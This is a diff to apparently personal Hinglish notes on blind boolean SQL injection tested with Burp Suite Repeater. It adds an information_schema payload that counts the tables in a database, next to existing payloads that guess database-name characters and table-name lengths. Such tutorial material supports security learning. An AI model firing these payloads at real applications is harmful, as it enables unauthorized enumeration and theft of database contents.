@@ -279,6 +279,12 @@ Rule: Burp Suite Repeater mein payload daalne ke baad space aur # wali line ko h
 
 `id=1 AND ASCII(SUBSTR(database(), 1, 1))=100#`
 
+### Finding How many tables exist
+
+`id=1 AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())=2#`
+
+**Agar Response True aata hai, toh is ka matlab hai total 2 tables hain.**
+
 ### Finding Table Length 
 
 `id=1 AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=9#`
